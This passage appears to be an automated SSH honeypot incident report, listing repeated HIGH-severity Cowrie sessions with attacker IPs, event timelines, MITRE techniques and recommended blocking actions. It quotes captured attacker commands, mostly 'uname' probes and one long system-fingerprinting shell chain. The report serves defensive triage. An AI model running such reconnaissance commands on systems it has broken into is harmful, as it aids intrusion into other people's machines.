| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:42:27` | `cowrie.session.connect` |
| `2026-09-05 17:42:27` | `cowrie.client.version` |
| `2026-09-05 17:42:27` | `cowrie.client.kex` |
| `2026-09-05 17:42:27` | `cowrie.login.success` |
| `2026-09-05 17:42:28` | `cowrie.session.params` |
| `2026-09-05 17:42:28` | `cowrie.command.input` |
| `2026-09-05 17:42:28` | `cowrie.log.closed` |
| `2026-09-05 17:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff8f27dbad5

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:42 |
| **Last Seen** | 2026-09-05 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:42:41` | `cowrie.session.connect` |
| `2026-09-05 17:42:41` | `cowrie.client.version` |
| `2026-09-05 17:42:41` | `cowrie.client.kex` |
| `2026-09-05 17:42:41` | `cowrie.login.success` |
| `2026-09-05 17:42:42` | `cowrie.session.params` |
| `2026-09-05 17:42:42` | `cowrie.command.input` |
| `2026-09-05 17:42:42` | `cowrie.log.closed` |
| `2026-09-05 17:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6830358beb87

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:42 |
| **Last Seen** | 2026-09-05 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:42:55` | `cowrie.session.connect` |
| `2026-09-05 17:42:55` | `cowrie.client.version` |
| `2026-09-05 17:42:55` | `cowrie.client.kex` |
| `2026-09-05 17:42:55` | `cowrie.login.success` |
| `2026-09-05 17:42:56` | `cowrie.session.params` |
| `2026-09-05 17:42:56` | `cowrie.command.input` |
| `2026-09-05 17:42:56` | `cowrie.log.closed` |
| `2026-09-05 17:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aec3afe125d

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:43 |
| **Last Seen** | 2026-09-05 17:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:43:10` | `cowrie.session.connect` |
| `2026-09-05 17:43:10` | `cowrie.client.version` |
| `2026-09-05 17:43:10` | `cowrie.client.kex` |
| `2026-09-05 17:43:10` | `cowrie.login.success` |
| `2026-09-05 17:43:10` | `cowrie.session.params` |
| `2026-09-05 17:43:10` | `cowrie.command.input` |
| `2026-09-05 17:43:10` | `cowrie.log.closed` |
| `2026-09-05 17:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8e683935e3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:43 |
| **Last Seen** | 2026-09-05 17:43 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:43:17` | `cowrie.session.connect` |
| `2026-09-05 17:43:19` | `cowrie.client.version` |
| `2026-09-05 17:43:19` | `cowrie.client.kex` |
| `2026-09-05 17:43:28` | `cowrie.login.success` |
| `2026-09-05 17:43:31` | `cowrie.session.params` |
| `2026-09-05 17:43:31` | `cowrie.command.input` |
| `2026-09-05 17:43:31` | `cowrie.command.input` |
| `2026-09-05 17:43:31` | `cowrie.command.input` |
| `2026-09-05 17:43:31` | `cowrie.command.input` |
| `2026-09-05 17:43:31` | `cowrie.command.input` |
| `2026-09-05 17:43:31` | `cowrie.command.success` |
| `2026-09-05 17:43:31` | `cowrie.command.input` |
| `2026-09-05 17:43:31` | `cowrie.command.input` |
| `2026-09-05 17:43:31` | `cowrie.command.input` |
| `2026-09-05 17:43:31` | `cowrie.command.input` |
| `2026-09-05 17:43:32` | `cowrie.log.closed` |
| `2026-09-05 17:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f47a08e6972

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:43 |
| **Last Seen** | 2026-09-05 17:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:43:24` | `cowrie.session.connect` |
| `2026-09-05 17:43:24` | `cowrie.client.version` |
| `2026-09-05 17:43:24` | `cowrie.client.kex` |
| `2026-09-05 17:43:24` | `cowrie.login.success` |
| `2026-09-05 17:43:25` | `cowrie.session.params` |
| `2026-09-05 17:43:25` | `cowrie.command.input` |
| `2026-09-05 17:43:25` | `cowrie.log.closed` |
| `2026-09-05 17:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0ef4d7b6e3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:43 |
| **Last Seen** | 2026-09-05 17:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:43:38` | `cowrie.session.connect` |
| `2026-09-05 17:43:38` | `cowrie.client.version` |
| `2026-09-05 17:43:38` | `cowrie.client.kex` |
| `2026-09-05 17:43:38` | `cowrie.login.success` |
| `2026-09-05 17:43:39` | `cowrie.session.params` |
| `2026-09-05 17:43:39` | `cowrie.command.input` |
| `2026-09-05 17:43:39` | `cowrie.log.closed` |
| `2026-09-05 17:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf715eb751d2

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:43 |
| **Last Seen** | 2026-09-05 17:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:43:53` | `cowrie.session.connect` |
| `2026-09-05 17:43:53` | `cowrie.client.version` |
| `2026-09-05 17:43:53` | `cowrie.client.kex` |
| `2026-09-05 17:43:53` | `cowrie.login.success` |
| `2026-09-05 17:43:53` | `cowrie.session.params` |
| `2026-09-05 17:43:53` | `cowrie.command.input` |
| `2026-09-05 17:43:54` | `cowrie.log.closed` |
| `2026-09-05 17:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f3fe24acf38

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:44 |
| **Last Seen** | 2026-09-05 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:44:07` | `cowrie.session.connect` |
| `2026-09-05 17:44:07` | `cowrie.client.version` |
| `2026-09-05 17:44:07` | `cowrie.client.kex` |
| `2026-09-05 17:44:07` | `cowrie.login.success` |
| `2026-09-05 17:44:08` | `cowrie.session.params` |
| `2026-09-05 17:44:08` | `cowrie.command.input` |
| `2026-09-05 17:44:08` | `cowrie.log.closed` |
| `2026-09-05 17:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4de977a2beb7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:44 |
| **Last Seen** | 2026-09-05 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:44:21` | `cowrie.session.connect` |
| `2026-09-05 17:44:21` | `cowrie.client.version` |
| `2026-09-05 17:44:21` | `cowrie.client.kex` |
| `2026-09-05 17:44:21` | `cowrie.login.success` |
| `2026-09-05 17:44:21` | `cowrie.session.params` |
| `2026-09-05 17:44:21` | `cowrie.command.input` |
| `2026-09-05 17:44:21` | `cowrie.log.closed` |
| `2026-09-05 17:44:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e6c34f596ff

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:44 |
| **Last Seen** | 2026-09-05 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:44:35` | `cowrie.session.connect` |
| `2026-09-05 17:44:35` | `cowrie.client.version` |
| `2026-09-05 17:44:35` | `cowrie.client.kex` |
| `2026-09-05 17:44:35` | `cowrie.login.success` |
| `2026-09-05 17:44:36` | `cowrie.session.params` |
| `2026-09-05 17:44:36` | `cowrie.command.input` |
| `2026-09-05 17:44:36` | `cowrie.log.closed` |
| `2026-09-05 17:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7bc05c30a5e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:44 |
| **Last Seen** | 2026-09-05 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:44:49` | `cowrie.session.connect` |
| `2026-09-05 17:44:49` | `cowrie.client.version` |
| `2026-09-05 17:44:49` | `cowrie.client.kex` |
| `2026-09-05 17:44:49` | `cowrie.login.success` |
| `2026-09-05 17:44:50` | `cowrie.session.params` |
| `2026-09-05 17:44:50` | `cowrie.command.input` |
| `2026-09-05 17:44:50` | `cowrie.log.closed` |
| `2026-09-05 17:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd6166c9c89

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:45 |
| **Last Seen** | 2026-09-05 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:45:03` | `cowrie.session.connect` |
| `2026-09-05 17:45:03` | `cowrie.client.version` |
| `2026-09-05 17:45:03` | `cowrie.client.kex` |
| `2026-09-05 17:45:04` | `cowrie.login.success` |
| `2026-09-05 17:45:04` | `cowrie.session.params` |
| `2026-09-05 17:45:04` | `cowrie.command.input` |
| `2026-09-05 17:45:04` | `cowrie.log.closed` |
| `2026-09-05 17:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-826e98efea49

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:45 |
| **Last Seen** | 2026-09-05 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:45:18` | `cowrie.session.connect` |
| `2026-09-05 17:45:18` | `cowrie.client.version` |
| `2026-09-05 17:45:18` | `cowrie.client.kex` |
| `2026-09-05 17:45:18` | `cowrie.login.success` |
| `2026-09-05 17:45:19` | `cowrie.session.params` |
| `2026-09-05 17:45:19` | `cowrie.command.input` |
| `2026-09-05 17:45:19` | `cowrie.log.closed` |
| `2026-09-05 17:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b332843c3a3e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:45 |
| **Last Seen** | 2026-09-05 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:45:32` | `cowrie.session.connect` |
| `2026-09-05 17:45:32` | `cowrie.client.version` |
| `2026-09-05 17:45:32` | `cowrie.client.kex` |
| `2026-09-05 17:45:32` | `cowrie.login.success` |
| `2026-09-05 17:45:33` | `cowrie.session.params` |
| `2026-09-05 17:45:33` | `cowrie.command.input` |
| `2026-09-05 17:45:33` | `cowrie.log.closed` |
| `2026-09-05 17:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4411914c007f

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:45 |
| **Last Seen** | 2026-09-05 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:45:46` | `cowrie.session.connect` |
| `2026-09-05 17:45:46` | `cowrie.client.version` |
| `2026-09-05 17:45:46` | `cowrie.client.kex` |
| `2026-09-05 17:45:47` | `cowrie.login.success` |
| `2026-09-05 17:45:47` | `cowrie.session.params` |
| `2026-09-05 17:45:47` | `cowrie.command.input` |
| `2026-09-05 17:45:47` | `cowrie.log.closed` |
| `2026-09-05 17:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-227b23796c75

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:46 |
| **Last Seen** | 2026-09-05 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:46:01` | `cowrie.session.connect` |
| `2026-09-05 17:46:01` | `cowrie.client.version` |
| `2026-09-05 17:46:01` | `cowrie.client.kex` |
| `2026-09-05 17:46:01` | `cowrie.login.success` |
| `2026-09-05 17:46:02` | `cowrie.session.params` |
| `2026-09-05 17:46:02` | `cowrie.command.input` |
| `2026-09-05 17:46:02` | `cowrie.log.closed` |
| `2026-09-05 17:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b3c8f7bf7b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:46 |
| **Last Seen** | 2026-09-05 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:46:15` | `cowrie.session.connect` |
| `2026-09-05 17:46:15` | `cowrie.client.version` |
| `2026-09-05 17:46:15` | `cowrie.client.kex` |
| `2026-09-05 17:46:15` | `cowrie.login.success` |
| `2026-09-05 17:46:16` | `cowrie.session.params` |
| `2026-09-05 17:46:16` | `cowrie.command.input` |
| `2026-09-05 17:46:16` | `cowrie.log.closed` |
| `2026-09-05 17:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa74c625f406

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:46 |
| **Last Seen** | 2026-09-05 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:46:30` | `cowrie.session.connect` |
| `2026-09-05 17:46:30` | `cowrie.client.version` |
| `2026-09-05 17:46:30` | `cowrie.client.kex` |
| `2026-09-05 17:46:30` | `cowrie.login.success` |
| `2026-09-05 17:46:31` | `cowrie.session.params` |
| `2026-09-05 17:46:31` | `cowrie.command.input` |
| `2026-09-05 17:46:31` | `cowrie.log.closed` |
| `2026-09-05 17:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22cf27876a1

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:46 |
| **Last Seen** | 2026-09-05 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:46:45` | `cowrie.session.connect` |
| `2026-09-05 17:46:45` | `cowrie.client.version` |
| `2026-09-05 17:46:45` | `cowrie.client.kex` |
| `2026-09-05 17:46:45` | `cowrie.login.success` |
| `2026-09-05 17:46:45` | `cowrie.session.params` |
| `2026-09-05 17:46:45` | `cowrie.command.input` |
| `2026-09-05 17:46:45` | `cowrie.log.closed` |
| `2026-09-05 17:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-552341752401

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:46 |
| **Last Seen** | 2026-09-05 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:46:59` | `cowrie.session.connect` |
| `2026-09-05 17:46:59` | `cowrie.client.version` |
| `2026-09-05 17:46:59` | `cowrie.client.kex` |
| `2026-09-05 17:46:59` | `cowrie.login.success` |
| `2026-09-05 17:47:00` | `cowrie.session.params` |
| `2026-09-05 17:47:00` | `cowrie.command.input` |
| `2026-09-05 17:47:00` | `cowrie.log.closed` |
| `2026-09-05 17:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faea80994df9

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:47 |
| **Last Seen** | 2026-09-05 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:47:14` | `cowrie.session.connect` |
| `2026-09-05 17:47:14` | `cowrie.client.version` |
| `2026-09-05 17:47:14` | `cowrie.client.kex` |
| `2026-09-05 17:47:14` | `cowrie.login.success` |
| `2026-09-05 17:47:14` | `cowrie.session.params` |
| `2026-09-05 17:47:14` | `cowrie.command.input` |
| `2026-09-05 17:47:15` | `cowrie.log.closed` |
| `2026-09-05 17:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f63368718c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:47 |
| **Last Seen** | 2026-09-05 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:47:29` | `cowrie.session.connect` |
| `2026-09-05 17:47:29` | `cowrie.client.version` |
| `2026-09-05 17:47:29` | `cowrie.client.kex` |
| `2026-09-05 17:47:29` | `cowrie.login.success` |
| `2026-09-05 17:47:29` | `cowrie.session.params` |
| `2026-09-05 17:47:29` | `cowrie.command.input` |
| `2026-09-05 17:47:29` | `cowrie.log.closed` |
| `2026-09-05 17:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd89f7d04d9

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:47 |
| **Last Seen** | 2026-09-05 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:47:43` | `cowrie.session.connect` |
| `2026-09-05 17:47:43` | `cowrie.client.version` |
| `2026-09-05 17:47:43` | `cowrie.client.kex` |
| `2026-09-05 17:47:43` | `cowrie.login.success` |
| `2026-09-05 17:47:44` | `cowrie.session.params` |
| `2026-09-05 17:47:44` | `cowrie.command.input` |
| `2026-09-05 17:47:44` | `cowrie.log.closed` |
| `2026-09-05 17:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-812c3e69ed13

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:47 |
| **Last Seen** | 2026-09-05 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:47:58` | `cowrie.session.connect` |
| `2026-09-05 17:47:58` | `cowrie.client.version` |
